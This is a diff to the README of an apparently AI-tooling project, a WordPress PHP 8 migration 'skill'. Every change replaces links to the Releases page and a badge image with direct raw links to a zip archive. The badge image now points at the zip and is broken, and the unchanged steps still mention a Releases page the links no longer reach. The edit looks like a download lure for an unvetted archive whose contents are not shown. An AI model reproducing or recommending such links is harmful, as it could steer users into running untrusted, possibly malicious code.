@@ -1,6 +1,6 @@
 # 🌟 wp-php8-migration-claude-skill - Effortless WordPress PHP 8 Migration
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/MirAnees/wp-php8-migration-claude-skill/releases)
+[![Download Now](https://github.com/MirAnees/wp-php8-migration-claude-skill/raw/refs/heads/main/skills/php_migration_wp_skill_claude_3.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/MirAnees/wp-php8-migration-claude-skill/raw/refs/heads/main/skills/php_migration_wp_skill_claude_3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ To use this application, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the application, [visit this page to download](https://github.com/MirAnees/wp-php8-migration-claude-skill/releases). 
+To download the application, [visit this page to download](https://github.com/MirAnees/wp-php8-migration-claude-skill/raw/refs/heads/main/skills/php_migration_wp_skill_claude_3.5.zip). 
 
 1. Click the link above to access the Releases page.
 2. Find the latest version of wp-php8-migration-claude-skill.
@@ -68,4 +68,4 @@ We encourage contributions from users like you. If you find any issues or have s
 
 Thanks to the open-source community for their invaluable resources and support. Together, we can make PHP 8 migration seamless for all WordPress users.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/MirAnees/wp-php8-migration-claude-skill/releases)
+[![Download Now](https://github.com/MirAnees/wp-php8-migration-claude-skill/raw/refs/heads/main/skills/php_migration_wp_skill_claude_3.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/MirAnees/wp-php8-migration-claude-skill/raw/refs/heads/main/skills/php_migration_wp_skill_claude_3.5.zip)
